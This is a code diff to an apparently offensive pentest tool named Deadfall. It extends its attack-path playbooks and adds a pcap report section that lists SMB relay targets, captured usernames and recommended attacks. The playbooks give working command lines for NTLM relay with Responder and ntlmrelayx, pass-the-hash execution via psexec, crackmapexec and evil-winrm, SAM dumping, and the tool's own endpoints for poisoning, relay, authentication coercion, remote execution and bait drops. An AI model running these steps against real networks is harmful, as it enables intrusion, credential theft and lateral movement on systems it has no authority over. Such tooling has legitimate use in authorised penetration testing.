@@ -1123,15 +1123,22 @@ ATTACK_PATHS = [
         "steps": [
             "Pick a NIC on the broadcast domain: `ip a`.",
             "Build a target list of hosts with SMB signing NOT required: "
-            "`crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt`.",
-            "Start ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`.",
-            "In parallel, start Responder: `responder -I eth0 -wrf`.",
-            "On the next LLMNR/NBT-NS/WPAD query, the client sends NetNTLMv2 → Responder "
-            "forwards it to ntlmrelayx → relayed to the unsigned target.",
-            "Pivot via `impacket-psexec` through the proxychains SOCKS or dump SAM with "
-            "`impacket-secretsdump`.",
+            "`crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt` "
+            "(or export `relay-targets.txt` from the 📦 loot tab).",
+            "External chain: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks` + "
+            "`responder -I eth0 -wrf`.",
+            "Deadfall-native chain: start the built-in poisoner (POST /api/responder/start) "
+            "and relay (POST /api/relay/start) — captured hashes land in the AD/hashes tab "
+            "without external tooling. Coerce authenticated machines with "
+            "POST /api/coerce (PetitPotam/PrinterBug class).",
+            "On the next LLMNR/NBT-NS/WPAD query, the client sends NetNTLMv2 → forwarded to "
+            "the unsigned target.",
+            "Pivot via `impacket-psexec` through the proxychains SOCKS, dump SAM with "
+            "`impacket-secretsdump`, or go straight to Deadfall's PTH actions once you hold "
+            "an NThash.",
         ],
-        "tools": ["Responder", "impacket ntlmrelayx", "CrackMapExec", "impacket-secretsdump"],
+        "tools": ["Responder", "impacket ntlmrelayx", "CrackMapExec", "impacket-secretsdump",
+                  "Deadfall poisoner/relay/coercer (built-in)"],
     },
     {
         "id": "mitm6",
@@ -1890,12 +1897,16 @@ ATTACK_PATHS = [
         "steps": [
             "Source the hash: NetNTLMv2 cracked offline (mode 5600), SAM dump from a "
             "compromised endpoint, or `secretsdump` from a target where you already have "
-            "SYSTEM.",
+            "SYSTEM. The AD/hashes tab exports hashcat-ready files directly.",
             "Confirm reachability: `crackmapexec smb <subnet> -u <user> -H <nthash>` "
             "lists every host where the hash works + admin context.",
             "Land code: `crackmapexec smb <host> -u <user> -H <nthash> -x 'whoami /all'` "
             "or `impacket-psexec <user>@<host> -hashes :<nthash>` for an interactive "
             "SYSTEM shell. WinRM variant: `evil-winrm -i <host> -u <user> -H <nthash>`.",
+            "Deadfall-native: every post-auth action takes `password` OR `nthash` — "
+            "enumerate with POST /api/samr/dump, execute with POST /api/exec/scmr "
+            "(psexec-class) or /api/exec/at (MS-TSCH), drop capture bait with "
+            "POST /api/bait/drop. No external tooling needed once you hold the hash.",
             "Pivot off the new host: dump LSASS → harvest more hashes/tickets; check "
             "`klist` for delegated tickets.",
             "Defender side: enable LSA Protection + Credential Guard; restrict NTLM "
@@ -1903,7 +1914,8 @@ ATTACK_PATHS = [
             "local-admin hashes differ per machine.",
         ],
         "tools": ["impacket psexec / wmiexec / smbexec",
-                  "CrackMapExec / nxc", "evil-winrm", "mimikatz `sekurlsa::pth`"],
+                  "CrackMapExec / nxc", "evil-winrm", "mimikatz `sekurlsa::pth`",
+                  "Deadfall post-auth actions (built-in)"],
     },
     {
         "id": "overpass-the-hash",
@@ -6410,6 +6422,37 @@ class PcapAnalysis:
                 out.append(f"- `{c.get('kind','')}` {up} ({c.get('src','')} → {c.get('dst','')}:{c.get('port','')})"
                            + (f" — {c['extra']}" if c.get("extra") else ""))
             out.append("")
+        relay = sorted(ip for ip, s in getattr(self, "smb_servers", {}).items()
+                       if not s.get("signing_required"))
+        if relay:
+            out.append("## SMB relay targets (signing not required)\n")
+            for ip in relay:
+                out.append(f"- `{ip}` — SMB2 negotiated without mandatory signing; "
+                           "NetNTLM relay lands here (`relay-targets.txt` for ntlmrelayx -tf).")
+            out.append("")
+        usernames = [u for u in self._build_users().splitlines() if u]
+        if usernames:
+            out.append("## Captured usernames\n")
+            out.append(", ".join(f"`{u}`" for u in usernames))
+            out.append("")
+        paths = self.analyze_attack_paths()
+        if paths:
+            out.append("## Recommended attack paths\n")
+            out.append("Playbooks derived from this capture's findings "
+                       "(evidence counts in brackets):\n")
+            for p in paths:
+                hosts = ", ".join(p.get("affected_hosts") or []) or "—"
+                out.append(f"### {p['name'].upper()} — {p['severity']} "
+                           f"({p.get('phase','')}) [{p['evidence_count']} evidence]\n")
+                out.append(f"- Affected hosts: `{hosts}`")
+                if p.get("amplifier_count"):
+                    out.append(f"- Amplifying findings: {p['amplifier_count']}")
+                out.append(f"- {p['description']}")
+                for i, s in enumerate(p.get("steps", []), 1):
+                    out.append(f"  {i}. {s}")
+                if p.get("tools"):
+                    out.append(f"- Tools: {', '.join(p['tools'])}")
+                out.append("")
         return "\n".join(out) + "\n"
 
     def _export_builders(self):
